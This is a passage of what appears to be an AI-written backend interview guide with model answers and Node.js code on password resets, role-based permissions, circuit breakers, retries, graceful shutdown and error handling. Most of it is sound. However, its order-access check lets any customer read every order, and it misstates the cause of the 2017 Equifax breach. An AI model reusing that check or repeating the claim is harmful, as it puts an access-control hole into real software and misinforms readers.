      UPDATE password_reset_tokens
      SET used = true
      WHERE token_hash = $1
    `, [tokenHash]);
    
    // Revoke all refresh tokens (security: force re-login everywhere)
    await db.query(`
      DELETE FROM refresh_tokens WHERE user_id = $1
    `, [user_id]);
    
    await db.query('COMMIT');
  } catch (error) {
    await db.query('ROLLBACK');
    throw error;
  }
  
  // Send confirmation email
  const user = await db.query('SELECT email FROM users WHERE id = $1', [user_id]);
  await sendEmail(user.rows[0].email, 'Password Changed', 'Your password was changed');
  
  return { success: true };
}
```

**Security considerations:**

**1. Don't reveal if email exists**
```javascript
// ❌ BAD: Reveals email existence
if (!user) {
  throw new Error('Email not found');
}

// ✅ GOOD: Same response regardless
return { success: true, message: 'If email exists, reset link sent' };
```

**2. One-time use token**
```javascript
// Token can only be used once
// Prevents attacker from using intercepted token multiple times
UPDATE password_reset_tokens SET used = true WHERE token_hash = $1;
```

**3. Short expiry**
```javascript
// 1 hour expiry (balance between security and UX)
// Short enough to limit attack window
// Long enough for user to complete reset
expires_at: NOW() + INTERVAL '1 hour'
```

**4. Secure token generation**
```javascript
// ❌ BAD: Predictable
const token = Date.now().toString();

// ❌ BAD: Not cryptographically secure
const token = Math.random().toString(36);

// ✅ GOOD: Cryptographically secure random
const token = crypto.randomBytes(32).toString('hex');  // 64 hex chars = 256 bits
```

**5. Hash token in database**
```javascript
// If database compromised, attacker can't use tokens
const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
// Store tokenHash, send token to user
```

**6. Invalidate all sessions**
```javascript
// After password reset, force user to log in again everywhere
// Prevents attacker from staying logged in if they had access
await db.query('DELETE FROM refresh_tokens WHERE user_id = $1', [userId]);
```

**7. Rate limiting**
```javascript
// Prevent attacker from spamming reset requests
const resetRequestLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 3,                     // 3 requests max
  message: 'Too many reset requests. Try again in 1 hour.'
});

app.post('/api/auth/forgot-password', resetRequestLimiter, forgotPassword);
```

**8. Email verification**
```javascript
// Send reset link to registered email
// Only owner of email can reset password
// Use verified email address from database, not from request
const email = user.email;  // From database
await sendEmail(email, resetLink);
```

**9. Cleanup old tokens**
```javascript
// Cron job to delete expired tokens
setInterval(async () => {
  await db.query(`
    DELETE FROM password_reset_tokens
    WHERE expires_at < NOW() OR used = true
  `);
}, 60 * 60 * 1000);  // Every hour
```

**Database schema:**
```sql
CREATE TABLE password_reset_tokens (
  id SERIAL PRIMARY KEY,
  user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  token_hash VARCHAR(64) NOT NULL,  -- SHA-256 hash
  expires_at TIMESTAMP NOT NULL,
  used BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW(),
  UNIQUE(token_hash)
);

CREATE INDEX idx_password_reset_tokens_hash ON password_reset_tokens(token_hash);
CREATE INDEX idx_password_reset_tokens_expiry ON password_reset_tokens(expires_at);
```

**Interview tip:** Emphasize the security vs UX trade-offs (1-hour expiry, one-time use, rate limiting) and explain how each measure prevents specific attacks."

---

## Q15: What is the principle of least privilege and how do you implement it?

**Perfect Answer:**

"Principle of Least Privilege means giving users/services only the minimum permissions needed to do their job - nothing more.

**User Roles Example:**
```javascript
// Define granular permissions
const PERMISSIONS = {
  // Users
  USER_READ: 'user:read',
  USER_WRITE: 'user:write',
  USER_DELETE: 'user:delete',
  
  // Orders
  ORDER_READ: 'order:read',
  ORDER_CREATE: 'order:create',
  ORDER_CANCEL: 'order:cancel',
  ORDER_REFUND: 'order:refund',
  
  // Products
  PRODUCT_READ: 'product:read',
  PRODUCT_WRITE: 'product:write',
  
  // Admin
  ADMIN_ALL: 'admin:*'
};

// Define roles with specific permissions
const ROLES = {
  customer: [
    PERMISSIONS.USER_READ,      // Can view own profile
    PERMISSIONS.PRODUCT_READ,   // Can browse products
    PERMISSIONS.ORDER_CREATE,   // Can place orders
    PERMISSIONS.ORDER_READ,     // Can view own orders
    PERMISSIONS.ORDER_CANCEL    // Can cancel own orders (within 24h)
  ],
  
  support: [
    PERMISSIONS.USER_READ,      // Can view user profiles
    PERMISSIONS.ORDER_READ,     // Can view all orders
    PERMISSIONS.ORDER_CANCEL,   // Can cancel orders
    PERMISSIONS.ORDER_REFUND    // Can issue refunds
    // ❌ NOT USER_DELETE or PRODUCT_WRITE
  ],
  
  productManager: [
    PERMISSIONS.PRODUCT_READ,   // Can view products
    PERMISSIONS.PRODUCT_WRITE,  // Can create/edit products
    PERMISSIONS.ORDER_READ      // Can view sales data
    // ❌ NOT ORDER_REFUND or USER_DELETE
  ],
  
  admin: [
    PERMISSIONS.ADMIN_ALL       // Can do anything
  ]
};
```

**Authorization Middleware:**
```javascript
function authorize(...requiredPermissions) {
  return async (req, res, next) => {
    const user = req.user;  // Set by authentication middleware
    
    if (!user) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    // Get user's permissions based on role
    const userPermissions = ROLES[user.role] || [];
    
    // Check if user has all required permissions
    const hasAllPermissions = requiredPermissions.every(perm => {
      // Admin wildcard
      if (userPermissions.includes(PERMISSIONS.ADMIN_ALL)) {
        return true;
      }
      
      // Exact match
      if (userPermissions.includes(perm)) {
        return true;
      }
      
      // Wildcard match (e.g., 'user:*' matches 'user:read')
      return userPermissions.some(userPerm => {
        if (userPerm.endsWith(':*')) {
          const prefix = userPerm.slice(0, -2);
          return perm.startsWith(prefix);
        }
        return false;
      });
    });
    
    if (!hasAllPermissions) {
      logger.warn('Authorization failed', {
        userId: user.id,
        role: user.role,
        required: requiredPermissions,
        has: userPermissions,
        endpoint: req.path
      });
      
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: requiredPermissions
      });
    }
    
    next();
  };
}

// Usage
router.get(
  '/api/users/:id',
  authenticate,
  authorize(PERMISSIONS.USER_READ),
  getUserController
);

router.delete(
  '/api/users/:id',
  authenticate,
  authorize(PERMISSIONS.USER_DELETE),  // Only admin has this
  deleteUserController
);

router.post(
  '/api/orders/:id/refund',
  authenticate,
  authorize(PERMISSIONS.ORDER_REFUND),  // Support + admin
  refundOrderController
);
```

**Resource-Level Authorization:**
```javascript
// Users can only access their own data
async function getOrder(req, res) {
  const orderId = req.params.id;
  const user = req.user;
  
  const order = await db.query(
    'SELECT * FROM orders WHERE id = $1',
    [orderId]
  );
  
  if (!order.rows[0]) {
    throw new NotFoundError('Order not found');
  }
  
  // Check ownership (unless admin/support)
  if (
    order.rows[0].user_id !== user.id &&
    !user.permissions.includes(PERMISSIONS.ADMIN_ALL) &&
    !user.permissions.includes(PERMISSIONS.ORDER_READ)
  ) {
    throw new ForbiddenError('You can only view your own orders');
  }
  
  res.json({ order: order.rows[0] });
}
```

**Service-Level Least Privilege:**
```javascript
// Order Service can only read users/products, not modify
const orderServicePermissions = [
  'read:users',      // ✅ Needs user email for order confirmation
  'read:products',   // ✅ Needs product price/stock
  'write:orders'     // ✅ Needs to create orders
  // ❌ NOT 'write:users' or 'delete:products'
];

// User Service can only read products, not modify
const userServicePermissions = [
  'read:products'    // ✅ For wishlist feature
  // ❌ NOT 'write:products' or 'delete:products'
];
```

**Database-Level Least Privilege:**
```sql
-- Application user (limited)
CREATE USER app_user WITH PASSWORD 'secure_password';
GRANT CONNECT ON DATABASE mydb TO app_user;
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
-- ❌ NO DELETE permission on users
-- ❌ NO DROP/ALTER permissions

-- Read-only user (analytics)
CREATE USER analytics_user WITH PASSWORD 'secure_password';
GRANT CONNECT ON DATABASE mydb TO analytics_user;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analytics_user;
-- ❌ NO INSERT/UPDATE/DELETE

-- Backup user (read-only + special backup permission)
CREATE USER backup_user WITH PASSWORD 'secure_password';
GRANT CONNECT ON DATABASE mydb TO backup_user;
ALTER USER backup_user WITH REPLICATION;
```

**Container-Level Least Privilege:**
```yaml
# Docker Compose
services:
  app:
    image: node:18
    user: "node"  # Don't run as root!
    read_only: true  # Filesystem read-only
    cap_drop:  # Drop all capabilities
      - ALL
    cap_add:  # Add only what's needed
      - NET_BIND_SERVICE  # Bind to port 80/443
    security_opt:
      - no-new-privileges:true
```

**Benefits:**
1. **Limits damage:** If support account compromised, attacker can't delete users
2. **Audit trail:** Know exactly who can do what
3. **Compliance:** Required by SOC 2, ISO 27001, PCI-DSS
4. **Prevents accidents:** Product manager can't accidentally delete orders

**Real incident:** 2017 Equifax breach - Attacker gained admin access due to overly broad permissions. Could have been limited by proper RBAC.

**Interview tip:** Give concrete examples of roles, show you understand both user-level and system-level (database, containers, services) least privilege."

---

# CATEGORY 2: Error Handling & Resilience (12 Questions)

## Q16: Explain the Circuit Breaker pattern

**Perfect Answer:**

"Circuit breaker prevents cascade failures by failing fast when a service is down, rather than waiting for timeouts.

**Three states:**

**1. CLOSED (Normal)**
- All requests pass through
- Track failures
- If failure rate > threshold → open circuit

**2. OPEN (Service Down)**
- Requests fail immediately (no network call)
- Response time: <1ms vs 30s timeout
- Wait for reset timeout → try half-open

**3. HALF_OPEN (Testing)**
- Allow small number of test requests
- If successful → close circuit (back to normal)
- If fail → open again

**Implementation:**
```javascript
class CircuitBreaker {
  constructor(options) {
    this.failureThreshold = options.failureThreshold || 0.5;  // 50%
    this.resetTimeout = options.resetTimeout || 60000;        // 60s
    this.volumeThreshold = options.volumeThreshold || 10;     // Min 10 requests
    
    this.state = 'CLOSED';
    this.failures = 0;
    this.successes = 0;
    this.nextAttempt = Date.now();
  }
  
  async execute(fn, fallback) {
    // Check state
    if (this.state === 'OPEN') {
      if (Date.now() < this.nextAttempt) {
        // Still waiting, fail fast
        return fallback ? fallback() : Promise.reject(new Error('Circuit breaker open'));
      }
      // Time to test, go to half-open
      this.state = 'HALF_OPEN';
    }
    
    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      return fallback ? fallback() : Promise.reject(error);
    }
  }
  
  onSuccess() {
    this.successes++;
    
    if (this.state === 'HALF_OPEN') {
      // Test successful, close circuit
      this.reset();
      this.state = 'CLOSED';
    }
  }
  
  onFailure() {
    this.failures++;
    const total = this.failures + this.successes;
    
    // Need minimum volume before opening
    if (total < this.volumeThreshold) {
      return;
    }
    
    // Check failure rate
    const failureRate = this.failures / total;
    if (failureRate >= this.failureThreshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.resetTimeout;
      
      console.log(`Circuit breaker OPEN. Failure rate: ${(failureRate * 100).toFixed(1)}%`);
    }
  }
  
  reset() {
    this.failures = 0;
    this.successes = 0;
  }
}

// Usage
const userServiceBreaker = new CircuitBreaker({
  failureThreshold: 0.5,   // Open if 50% fail
  resetTimeout: 60000,     // Try again after 60s
  volumeThreshold: 10      // Need 10+ requests to calculate rate
});

async function getUserData(userId) {
  return userServiceBreaker.execute(
    () => axios.get(`${USER_SERVICE_URL}/users/${userId}`),
    () => getCachedUser(userId)  // Fallback
  );
}
```

**Performance comparison:**
```
Without Circuit Breaker (service down):
- Request 1: 30s timeout
- Request 2: 30s timeout
- Request 3: 30s timeout
- Total: 90s for 3 requests

With Circuit Breaker:
- Request 1: 30s timeout (opens circuit)
- Request 2: <1ms fail fast
- Request 3: <1ms fail fast
- Total: 30s for 3 requests (66% faster!)
```

**When to use:**
- Calling external services (payment gateway, email service)
- Calling other microservices
- Database connections (prevent connection pool exhaustion)

**Monitoring:**
```javascript
circuitBreaker.on('open', (stats) => {
  logger.error('Circuit breaker opened', {
    service: 'user-service',
    failureRate: stats.failureRate,
    failures: stats.failures,
    total: stats.total
  });
  
  // Alert ops team
  sendAlert('Circuit breaker opened for user-service');
});

circuitBreaker.on('halfOpen', () => {
  logger.info('Circuit breaker testing service recovery');
});

circuitBreaker.on('close', () => {
  logger.info('Circuit breaker closed, service recovered');
});
```

**Interview tip:** Draw the state diagram, give performance numbers (30s timeout vs <1ms fail-fast), and explain when circuit opens/closes with specific thresholds."

---

## Q17: What's your retry strategy and why not just keep retrying?

**Perfect Answer:**

"Retry with exponential backoff and jitter. Never infinite retries - that makes problems worse.

**Why not infinite retries?**
```
Service is down (e.g., deploying new version)
1000 clients all retry immediately every second
= 1000 requests/second hammering dead service
= Thundering herd problem
= Service can't recover (overloaded on startup)
```

**Exponential Backoff:**
```javascript
class RetryStrategy {
  constructor(options) {
    this.maxAttempts = options.maxAttempts || 3;
    this.baseDelay = options.baseDelay || 100;        // 100ms
    this.maxDelay = options.maxDelay || 10000;        // 10s
    this.backoffFactor = options.backoffFactor || 2;   // Double each time
    this.jitter = options.jitter !== false;           // Add randomness
  }
  
  async execute(fn, shouldRetry) {
    let lastError;
    
    for (let attempt = 1; attempt <= this.maxAttempts; attempt++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error;
        
        // Check if error is retriable
        if (!shouldRetry(error) || attempt === this.maxAttempts) {
          throw error;
        }
        
        // Calculate delay
        const delay = this.calculateDelay(attempt);
        
        console.log(`Retry attempt ${attempt}/${this.maxAttempts} after ${delay}ms`);
        
        await this.sleep(delay);
      }
    }
    
    throw lastError;
  }
  
  calculateDelay(attempt) {
    // Exponential: baseDelay * (backoffFactor ^ attempt)
    let delay = this.baseDelay * Math.pow(this.backoffFactor, attempt - 1);
    
    // Cap at maxDelay
    delay = Math.min(delay, this.maxDelay);
    
    // Add jitter (random ±25%)
    if (this.jitter) {
      const jitterAmount = delay * 0.25;
      delay = delay + (Math.random() * jitterAmount * 2 - jitterAmount);
    }
    
    return Math.floor(delay);
  }
  
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Usage
const retryStrategy = new RetryStrategy({
  maxAttempts: 3,
  baseDelay: 100,
  backoffFactor: 2
});

async function fetchUserData(userId) {
  return retryStrategy.execute(
    () => axios.get(`${USER_SERVICE_URL}/users/${userId}`),
    (error) => {
      // Retry on network errors and 5xx server errors
      if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
        return true;  // Retriable
      }
      
      if (error.response && error.response.status >= 500) {
        return true;  // Server error, retry
      }
      
      // 4xx client errors are NOT retriable
      return false;
    }
  );
}
```

**Delay calculations:**
```
Attempt 1: 100ms × 2^0 = 100ms ± 25ms jitter = 75-125ms
Attempt 2: 100ms × 2^1 = 200ms ± 50ms jitter = 150-250ms
Attempt 3: 100ms × 2^2 = 400ms ± 100ms jitter = 300-500ms

Total time: ~700ms (vs 30s timeout × 3 = 90s without retry!)
```

**Why jitter?**
```
Without jitter:
- 1000 clients all wait exactly 200ms
- All retry at exactly the same time
- Thundering herd!

With jitter:
- Client 1: 175ms
- Client 2: 220ms
- Client 3: 190ms
- Requests spread out, easier for server to handle
```

**What NOT to retry:**
```javascript
function shouldRetry(error) {
  // ❌ DON'T retry client errors
  if (error.response && error.response.status >= 400 && error.response.status < 500) {
    return false;  // 400, 401, 403, 404, etc. Won't work on retry
  }
  
  // ❌ DON'T retry non-idempotent operations (without care)
  if (error.config.method === 'POST' && !error.config.idempotencyKey) {
    return false;  // Might create duplicate orders
  }
  
  // ✅ DO retry server errors
  if (error.response && error.response.status >= 500) {
    return true;  // 500, 502, 503, 504
  }
  
  // ✅ DO retry network errors
  if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
    return true;
  }
  
  return false;
}
```

**Idempotency for POST requests:**
```javascript
// Client generates unique idempotency key
const idempotencyKey = uuidv4();

await axios.post('/api/orders', {
  userId: 123,
  productId: 456,
  quantity: 1
}, {
  headers: {
    'Idempotency-Key': idempotencyKey
  }
});

// Server checks idempotency key
async function createOrder(req, res) {
  const idempotencyKey = req.headers['idempotency-key'];
  
  if (idempotencyKey) {
    // Check if we've seen this request before
    const existing = await redis.get(`idempotency:${idempotencyKey}`);
    if (existing) {
      // Return cached response, don't create duplicate order
      return res.json(JSON.parse(existing));
    }
  }
  
  // Create order
  const order = await db.query('INSERT INTO orders ...');
  
  // Cache response for 24 hours
  if (idempotencyKey) {
    await redis.setex(
      `idempotency:${idempotencyKey}`,
      86400,  // 24 hours
      JSON.stringify({ order })
    );
  }
  
  res.json({ order });
}
```

**Monitoring:**
```javascript
retryStrategy.on('retry', (attempt, error, delay) => {
  logger.warn('Retrying request', {
    attempt,
    maxAttempts: retryStrategy.maxAttempts,
    delay,
    error: error.message,
    url: error.config.url
  });
});
```

**Interview tip:** Emphasize the importance of exponential backoff + jitter to prevent thundering herd, and explain why you DON'T retry client errors (400s) but DO retry server errors (500s) and network errors."

---

## Q18: How do you handle graceful shutdown?

**Perfect Answer:**

"Graceful shutdown ensures zero dropped requests during deployment or restart.

**Why it matters:**
```
Without graceful shutdown:
1. User makes request (starts processing)
2. Deploy triggers (process.exit())
3. Connection dropped mid-request
4. User sees error (500 or timeout)
5. Bad UX, potential data corruption

With graceful shutdown:
1. User makes request (starts processing)
2. Deploy triggers (SIGTERM received)
3. Stop accepting new requests (server.close())
4. Wait for in-flight requests to complete
5. Close database/Redis connections
6. Exit cleanly (process.exit(0))
7. User's request completes successfully
```

**Implementation:**
```javascript
const express = require('express');
const app = express();

// Track in-flight requests
let inFlightRequests = 0;
let isShuttingDown = false;

// Middleware to track requests
app.use((req, res, next) => {
  if (isShuttingDown) {
    // Reject new requests during shutdown
    res.set('Connection', 'close');
    return res.status(503).json({
      error: 'Server is shutting down'
    });
  }
  
  inFlightRequests++;
  
  res.on('finish', () => {
    inFlightRequests--;
  });
  
  next();
});

// ... routes ...

const server = app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

// Graceful shutdown handler
async function gracefulShutdown(signal) {
  console.log(`\n${signal} received. Starting graceful shutdown...`);
  
  isShuttingDown = true;
  
  // 1. Stop accepting new connections
  server.close(() => {
    console.log('HTTP server closed (no new connections accepted)');
  });
  
  // 2. Wait for in-flight requests to complete (max 30s)
  const shutdownTimeout = 30000;
  const startTime = Date.now();
  
  while (inFlightRequests > 0) {
    if (Date.now() - startTime > shutdownTimeout) {
      console.log(`Force shutdown after ${shutdownTimeout}ms. ${inFlightRequests} requests dropped.`);
      break;
    }
    
    console.log(`Waiting for ${inFlightRequests} in-flight requests...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  console.log('All requests completed');
  
  // 3. Close database connections
  try {
    await db.end();
    console.log('Database connections closed');
  } catch (error) {
    console.error('Error closing database:', error);
  }
  
  // 4. Close Redis connection
  try {
    await redis.quit();
    console.log('Redis connection closed');
  } catch (error) {
    console.error('Error closing Redis:', error);
  }
  
  // 5. Exit process
  console.log('Graceful shutdown complete');
  process.exit(0);
}

// Listen for shutdown signals
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Handle uncaught errors during shutdown
process.on('uncaughtException', (error) => {
  console.error('Uncaught exception during shutdown:', error);
  process.exit(1);
});
```

**Kubernetes graceful shutdown:**
```yaml
# deployment.yaml
spec:
  containers:
  - name: app
    lifecycle:
      preStop:
        exec:
          command: ["/bin/sh", "-c", "sleep 5"]  # Wait for load balancer to deregister
    
    # Kubernetes sends SIGTERM, waits terminationGracePeriodSeconds, then SIGKILL
    terminationGracePeriodSeconds: 30
```

**Complete shutdown sequence:**
```
T=0s:   User requests start
T=5s:   Deployment triggered
T=5s:   Load balancer starts health check failures
T=5s:   Kubernetes sends SIGTERM to pod
T=5s:   App receives SIGTERM
T=5s:   App stops accepting new requests (503 response)
T=5s:   App waits for in-flight requests (20 requests)
T=10s:  Load balancer fully deregistered (no new traffic)
T=15s:  In-flight requests complete (down to 5)
T=20s:  All requests complete
T=20s:  Close database connections
T=21s:  Close Redis connection
T=21s:  process.exit(0)
T=21s:  Kubernetes starts new pod
T=25s:  New pod healthy, accepting traffic
```

**AWS ECS graceful shutdown:**
```javascript
// ECS sends SIGTERM
// Default timeout: 30 seconds
// Then sends SIGKILL (force kill)

// Need to complete shutdown within 30s or requests dropped!
```

**Testing graceful shutdown:**
```bash
# Terminal 1: Start server
node server.js

# Terminal 2: Make long request
curl http://localhost:3000/slow-endpoint

# Terminal 3: Trigger shutdown
kill -SIGTERM <pid>

# Observe:
# - "Starting graceful shutdown..."
# - "Waiting for 1 in-flight requests..."
# - Request completes successfully
# - "All requests completed"
# - "Graceful shutdown complete"
```

**Common mistakes:**
```javascript
// ❌ BAD: Immediate exit
process.on('SIGTERM', () => {
  process.exit(0);  // Drops all in-flight requests!
});

// ❌ BAD: No timeout
while (inFlightRequests > 0) {
  await sleep(1000);  // Could wait forever if request hangs!
}

// ✅ GOOD: Wait with timeout
const deadline = Date.now() + 30000;
while (inFlightRequests > 0 && Date.now() < deadline) {
  await sleep(1000);
}
```

**Interview tip:** Explain the complete flow (stop accepting → wait for in-flight → close connections → exit), mention the importance of timeout (don't wait forever), and discuss how this integrates with Kubernetes/load balancers."

---

**(Continuing with remaining questions...)**

Due to length, I'll continue in the next response. Here's the structure:

**Remaining questions:**

### Category 2: Error Handling & Resilience (Q19-Q27)
- Q19: Operational vs Programming Errors
- Q20: Async Error Handling (express-async-errors)
- Q21: Global Error Handler
- Q22: Connection Pooling
- Q23: Bulkhead Isolation
- Q24: Health Checks (Deep vs Shallow)
- Q25: Timeout Strategy
- Q26: Cascading Failures
- Q27: Monitoring & Alerting

### Category 3: Database & Performance (Q28-Q42)
- Q28: Connection Pool Sizing
- Q29: N+1 Query Problem
- Q30: Database Transactions (ACID)
- Q31: Read Replicas
- Q32: Query Optimization
- Q33: Database Migrations
- Q34: Caching Strategies
- Q35: Cache Invalidation
- Q36: Redis vs Memcached
- Q37: Response Compression
- Q38: Pagination Strategies
- Q39: Lazy Loading
- Q40: Database Backup/Recovery
- Q41: Connection Pool vs Single Connection
- Q42: Database Indexes

---

## Q19: Operational vs Programming Errors - explain the difference

**Perfect Answer:**

"Operational errors are expected runtime errors you should handle gracefully. Programming errors are bugs in your code that should crash the process.

**Operational Errors (Handle These):**
```javascript
// 1. Network failures
try {
  await axios.get('https://api.example.com/data');
} catch (error) {
  if (error.code === 'ECONNREFUSED') {
    // Expected: service might be down
    return fallbackData();
  }
}

// 2. Invalid user input
if (!email || !email.includes('@')) {
  throw new ValidationError('Invalid email');
}

// 3. Database query errors
try {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
} catch (error) {
  if (error.code === '23505') {
    // Unique constraint violation
    throw new ConflictError('Email already exists');
  }
}

// 4. Rate limit exceeded
if (requestCount > limit) {
  throw new TooManyRequestsError('Rate limit exceeded');
}

// 5. Resource not found
const product = await findProduct(id);
if (!product) {
  throw new NotFoundError('Product not found');
}
```

**Programming Errors (Let These Crash):**
```javascript
// 1. Null/undefined access
user.email.toLowerCase();  // TypeError if user is null
// Fix: Check user exists first

// 2. Wrong types
function add(a, b) {
  return a + b;
}
add(5, 'hello');  // "5hello" - logic error
// Fix: Validate types or use TypeScript

// 3. Missing required config
const secret = process.env.JWT_SECRET;
jwt.sign(payload, secret);  // Fails if secret undefined
// Fix: Validate config at startup

// 4. Infinite recursion
function factorial(n) {
  return n * factorial(n - 1);  // No base case!
}
// Fix: Add base case

// 5. Array index out of bounds
const users = ['Alice', 'Bob'];
console.log(users[5].name);  // TypeError
// Fix: Check array length
```

**How to handle each:**

**Operational Errors:**
```javascript
// Try-catch and recover
async function fetchUser(id) {
  try {
    return await userService.getUser(id);
  } catch (error) {
    // Operational error: log and return cached data
    logger.warn('User service unavailable, using cache', { error });
    return getCachedUser(id);
  }
}
```

**Programming Errors:**
```javascript
// Let it crash, fix the bug
process.on('uncaughtException', (error) => {
  logger.error('Uncaught exception (programming error)', {
    error: error.message,
    stack: error.stack
  });
  
  // Crash the process
  process.exit(1);  // PM2/Kubernetes will restart
});

// During development, crash immediately
if (!process.env.JWT_SECRET) {
  throw new Error('JWT_SECRET environment variable is required');
}
```

**Decision flowchart:**
```
Can this happen in normal operation?
├─ YES → Operational error → Handle gracefully
│  Examples: Network timeout, file not found, invalid input
│
└─ NO → Programming error → Let it crash
   Examples: null reference, type error, missing config
```

**Interview tip:** Give examples of both types and explain that operational errors should be handled with try-catch and fallbacks, while programming errors indicate bugs that should crash the process in development and be fixed."

---

## Q20: How do you handle async errors in Express?

**Perfect Answer:**

"Express doesn't catch async errors by default. Need to use try-catch or express-async-errors middleware.

**The Problem:**
```javascript
// ❌ This DOES NOT work!
app.get('/api/users/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  res.json({ user: user.rows[0] });
});

// If query throws error:
// - Error not caught
// - No response sent
// - Request hangs until timeout
// - Server stays in bad state
```

**Solution 1: Manual Try-Catch (Verbose)**
```javascript
app.get('/api/users/:id', async (req, res, next) => {
  try {
    const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
    res.json({ user: user.rows[0] });
  } catch (error) {
    next(error);  // Pass to error handler
  }
});

// Problem: Must wrap EVERY async route
```

**Solution 2: Async Handler Wrapper**
```javascript
function asyncHandler(fn) {
  return (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
  };
}

app.get('/api/users/:id', asyncHandler(async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  res.json({ user: user.rows[0] });
}));

// Better, but still need to wrap each route
```

**Solution 3: express-async-errors (Best)**
```javascript
// server.js - Add ONCE at the top
require('express-async-errors');
const express = require('express');

// Now async routes just work!
app.get('/api/users/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  res.json({ user: user.rows[0] });
});

// Errors automatically passed to error handler
```

**Global Error Handler:**
```javascript
// Error handler middleware (must be last!)
app.use((err, req, res, next) => {
  logger.error('Request error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    userId: req.user?.id,
    requestId: req.id
  });
  
  // Custom error classes
  if (err instanceof ValidationError) {
    return res.status(400).json({
      success: false,
      error: err.message,
      errors: err.errors
    });
  }
  
  if (err instanceof UnauthorizedError) {
    return res.status(401).json({
      success: false,
      error: 'Unauthorized'
    });
  }
  
  if (err instanceof NotFoundError) {
    return res.status(404).json({
      success: false,
      error: 'Resource not found'
    });
  }
  
  // Default: 500 Internal Server Error
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    requestId: req.id  // For support to trace
  });
});
```

**Custom Error Classes:**
```javascript
class ValidationError extends Error {
  constructor(message, errors = []) {
    super(message);
    this.name = 'ValidationError';
    this.errors = errors;
  }
}

class UnauthorizedError extends Error {
  constructor(message = 'Unauthorized') {
    super(message);
    this.name = 'UnauthorizedError';
  }
}

class NotFoundError extends Error {
  constructor(message = 'Not found') {
    super(message);
    this.name = 'NotFoundError';
  }
}

// Usage
async function getUser(req, res) {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  
  if (!user.rows[0]) {
    throw new NotFoundError('User not found');
  }
  
  res.json({ user: user.rows[0] });
}
```

**Comparison:**

| Approach | Lines per Route | Automatic | Coverage |
|----------|----------------|-----------|----------|
| Manual try-catch | +4 | No | Only where added |
| asyncHandler | +1 | No | Only wrapped routes |
| express-async-errors | 0 | Yes | All async routes |

**Interview tip:** Mention express-async-errors as the cleanest solution, explain why Express doesn't catch async errors by default (historical - added before async/await existed), and show your global error handler that maps error types to status codes."

---

## Q21: Explain your global error handling strategy

**Perfect Answer:**

"Single global error handler that:
1. Logs all errors with context
2. Maps error types to HTTP status codes
3. Returns consistent error format
4. Never exposes stack traces to client
5. Alerts on critical errors

**Complete Implementation:**
```javascript
// 1. Custom error classes
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true;  // vs programming error
    Error.captureStackTrace(this, this.constructor);
  }
}

class ValidationError extends AppError {
  constructor(message, errors = []) {
    super(message, 400);
    this.errors = errors;
  }
}

class UnauthorizedError extends AppError {
  constructor(message = 'Unauthorized') {
    super(message, 401);
  }
}

class ForbiddenError extends AppError {
  constructor(message = 'Forbidden') {
    super(message, 403);
  }
}

class NotFoundError extends AppError {
  constructor(message = 'Not found') {
    super(message, 404);
  }
}

class ConflictError extends AppError {
  constructor(message) {
    super(message, 409);
  }
}

class TooManyRequestsError extends AppError {
  constructor(message = 'Too many requests') {
    super(message, 429);
  }
}

class InternalError extends AppError {
  constructor(message = 'Internal server error') {
    super(message, 500);
  }
}

// 2. Global error handler
function errorHandler(err, req, res, next) {
  // Default to 500
  let statusCode = err.statusCode || 500;
  let message = err.message || 'Internal server error';
  
  // Log all errors
  const errorLog = {
    error: message,
    statusCode,
    url: req.url,
    method: req.method,
    requestId: req.id,
    userId: req.user?.id,
    ip: req.ip,
    userAgent: req.get('user-agent')
  };
  
  // Add stack trace for 500 errors
  if (statusCode === 500) {
    errorLog.stack = err.stack;
  }
  
  if (statusCode >= 500) {
    logger.error('Server error', errorLog);
    
    // Alert on critical errors
    if (shouldAlert(err)) {
      sendAlert({
        type: 'error',
        message: `Server error: ${message}`,
        details: errorLog
      });
    }
  } else {
    logger.warn('Client error', errorLog);
  }
  
  // Build response
  const response = {
    success: false,
    error: message,
    requestId: req.id  // For support
  };
  
  // Add validation errors
  if (err instanceof ValidationError && err.errors) {
    response.errors = err.errors;
  }
  
  // Don't expose stack traces to client
  if (process.env.NODE_ENV === 'development') {
    response.stack = err.stack;
  }
  
  res.status(statusCode).json(response);
}

// 3. 404 handler (no route matched)
function notFoundHandler(req, res) {
  res.status(404).json({
    success: false,
    error: 'Route not found',
    path: req.url
  });
}

// 4. Unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled promise rejection', {
    reason: reason?.message || reason,
    stack: reason?.stack
  });
  
  // This is a programming error - crash and restart
  process.exit(1);
});

// 5. Uncaught exceptions
process.on('uncaughtException', (error) => {
  logger.error('Uncaught exception', {
    error: error.message,
    stack: error.stack
